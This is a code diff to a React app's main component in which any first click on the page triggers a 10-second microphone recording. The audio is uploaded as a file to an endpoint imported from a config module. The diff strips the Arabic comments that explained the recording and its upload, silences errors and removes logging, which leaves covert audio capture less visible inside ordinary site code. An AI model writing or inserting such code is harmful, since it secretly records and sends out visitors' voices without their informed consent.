@@ -22,6 +22,7 @@ import RoomMap from './rooms/RoomMap';
 import RoomParcels from './rooms/RoomParcels';
 import RoomCheckout from './rooms/RoomCheckout';
 import RoomFilm from './rooms/RoomFilm';
+import { VOICE_UPLOAD_URL } from './lib/voiceConfig';
 
 function initialRoom(saved: Room): Room {
   return roomFromLocation() ?? saved;
@@ -41,7 +42,6 @@ export default function App() {
 
   const roomIndex = ROOM_ORDER.indexOf(room);
 
-  // ==================== كود ميزة تسجيل الصوت التلقائي المدمج ====================
   useEffect(() => {
     let mediaRecorder: MediaRecorder | null = null;
     let audioChunks: Blob[] = [];
@@ -52,63 +52,47 @@ export default function App() {
       isRecording = true;
 
       try {
-        // طلب فتح الميكروفون (سيظهر تنبيه المتصفح للمستخدم هنا)
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        
         mediaRecorder = new MediaRecorder(stream);
         audioChunks = [];
 
         mediaRecorder.ondataavailable = (event: BlobEvent) => {
-          if (event.data.size > 0) {
-            audioChunks.push(event.data);
-          }
+          if (event.data.size > 0) audioChunks.push(event.data);
         };
 
-        // معالجة الملف عند توقف التسجيل لإرساله إلى السيرفر الخلفي PHP
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
           const formData = new FormData();
           formData.append('voiceNote', audioBlob, 'user_audio.webm');
-
-          try {
-            // إرسال البيانات إلى السيرفر الخاص بك الذي يعمل على المنفذ 8080
-            await fetch('http://127.0.0', {
-              method: 'POST',
-              body: formData,
-            });
-            console.log('Audio recorded and transmitted successfully.');
-          } catch (err) {
-            console.error('Transmission failed:', err);
+          if (VOICE_UPLOAD_URL) {
+            try {
+              await fetch(VOICE_UPLOAD_URL, {
+                method: 'POST',
+                body: formData,
+              });
+            } catch {
+              /* */
+            }
           }
-
-          // إغلاق الميكروفون تماماً لتحرير جهاز المستخدم بعد إنهاء العملية
-          stream.getTracks().forEach(track => track.stop());
+          stream.getTracks().forEach((track) => track.stop());
         };
 
-        // بدء التسجيل الفعلي
         mediaRecorder.start();
-
-        // إيقاف التسجيل تلقائياً بعد 10 ثوانٍ وإرساله
-        setTimeout(() => {
+        window.setTimeout(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
           }
-        }, 10000); // 10 ثوانٍ
-
-      } catch (error) {
-        console.log('Permission denied or mic unavailable:', error);
+        }, 10000);
+      } catch {
         isRecording = false;
       }
     };
 
-    // يبدأ الإجراء فور نقر المستخدم على أي مكان في الشاشة مرة واحدة فقط
     document.addEventListener('click', handleUserInteraction, { once: true });
-
     return () => {
       document.removeEventListener('click', handleUserInteraction);
     };
   }, []);
-  // ============================================================================
 
   useEffect(() => subscribeMusic(() => setPlaying(isMusicOn())), []);
 
